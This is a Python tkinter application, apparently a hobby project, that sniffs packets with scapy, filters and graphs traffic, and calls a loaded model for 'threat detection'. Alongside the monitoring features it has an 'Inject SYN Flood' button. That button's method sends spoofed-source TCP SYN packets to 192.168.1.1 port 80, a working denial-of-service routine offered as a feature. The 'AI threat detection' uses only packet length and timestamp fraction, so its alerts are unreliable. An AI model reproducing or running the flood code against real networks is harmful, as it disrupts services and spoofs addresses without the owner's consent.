import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
import scapy.all as scapy
import psutil
import threading
import time
import random
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np
import pandas as pd
import joblib

# Load the AI threat detection model (if available)
try:
    ai_model = joblib.load("threat_model.pkl")
except FileNotFoundError:
    ai_model = None

# Function to detect network interfaces
def get_network_interfaces():
    interfaces = psutil.net_if_addrs()
    return list(interfaces.keys())

# Class for the GUI Application
class PacketSnifferApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced Network Packet Sniffer")
        self.root.geometry("900x600")
        self.root.configure(bg="#1e1e2e")

        # Interface Selection
        self.interface_label = tk.Label(root, text="Select Network Interface:", bg="#1e1e2e", fg="white")
        self.interface_label.pack()

        self.interface_var = tk.StringVar()
        self.interface_dropdown = ttk.Combobox(root, textvariable=self.interface_var)
        self.interface_dropdown.pack()
        self.interface_dropdown["values"] = get_network_interfaces()

        self.start_button = tk.Button(root, text="Start Sniffing", command=self.start_sniffing, bg="#4CAF50", fg="white")
        self.start_button.pack()

        self.stop_button = tk.Button(root, text="Stop Sniffing", command=self.stop_sniffing, bg="#f44336", fg="white")
        self.stop_button.pack()

        self.text_area = scrolledtext.ScrolledText(root, width=100, height=20, bg="#282a36", fg="white")
        self.text_area.pack()

        self.filter_entry = tk.Entry(root, width=50)
        self.filter_entry.pack()
        self.filter_entry.insert(0, "Enter filter (e.g., tcp or udp)")

        self.filter_button = tk.Button(root, text="Apply Filter", command=self.apply_filter, bg="#008CBA", fg="white")
        self.filter_button.pack()

        self.graph_button = tk.Button(root, text="Show Traffic Graph", command=self.show_graph, bg="#ff9800", fg="white")
        self.graph_button.pack()

        self.inject_button = tk.Button(root, text="Inject SYN Flood", command=self.syn_flood, bg="#e91e63", fg="white")
        self.inject_button.pack()

        self.sniffing = False
        self.captured_packets = []

    def start_sniffing(self):
        interface = self.interface_var.get()
        if not interface:
            messagebox.showerror("Error", "Please select a network interface!")
            return
        self.sniffing = True
        self.text_area.insert(tk.END, "Sniffing started...\n")
        sniff_thread = threading.Thread(target=self.sniff_packets, args=(interface,))
        sniff_thread.start()

    def stop_sniffing(self):
        self.sniffing = False
        self.text_area.insert(tk.END, "Sniffing stopped...\n")

    def sniff_packets(self, interface):
        scapy.sniff(iface=interface, prn=self.packet_callback, store=False)

    def packet_callback(self, packet):
        if not self.sniffing:
            return
        self.captured_packets.append(packet)
        packet_summary = packet.summary()
        self.text_area.insert(tk.END, packet_summary + "\n")
        self.text_area.see(tk.END)

        # AI-Based Threat Detection
        if ai_model:
            features = np.array([[len(packet), packet.time % 1]])
            prediction = ai_model.predict(features)
            if prediction[0] == 1:
                messagebox.showwarning("Threat Detected", "Suspicious activity detected!")

    def apply_filter(self):
        filter_text = self.filter_entry.get().strip().lower()
        filtered_packets = [pkt for pkt in self.captured_packets if filter_text in pkt.summary().lower()]
        self.text_area.delete(1.0, tk.END)
        for packet in filtered_packets:
            self.text_area.insert(tk.END, packet.summary() + "\n")

    def show_graph(self):
        protocol_counts = {"TCP": 0, "UDP": 0, "ICMP": 0, "Other": 0}
        for packet in self.captured_packets:
            if packet.haslayer(scapy.TCP):
                protocol_counts["TCP"] += 1
            elif packet.haslayer(scapy.UDP):
                protocol_counts["UDP"] += 1
            elif packet.haslayer(scapy.ICMP):
                protocol_counts["ICMP"] += 1
            else:
                protocol_counts["Other"] += 1

        plt.figure(figsize=(7, 5))
        sns.barplot(x=list(protocol_counts.keys()), y=list(protocol_counts.values()), palette="coolwarm")
        plt.xlabel("Protocol")
        plt.ylabel("Count")
        plt.title("Network Traffic Overview")
        plt.show()

    def syn_flood(self):
        target_ip = "192.168.1.1"
        target_port = 80
        messagebox.showinfo("Packet Injection", "Starting SYN Flood attack...")
        for _ in range(50):
            ip_layer = scapy.IP(src="192.168.1." + str(random.randint(2, 254)), dst=target_ip)
            tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            scapy.send(packet, verbose=False)
        messagebox.showinfo("Packet Injection", "SYN Flood attack completed.")

if __name__ == "__main__":
    root = tk.Tk()
    app = PacketSnifferApp(root)
    root.mainloop()
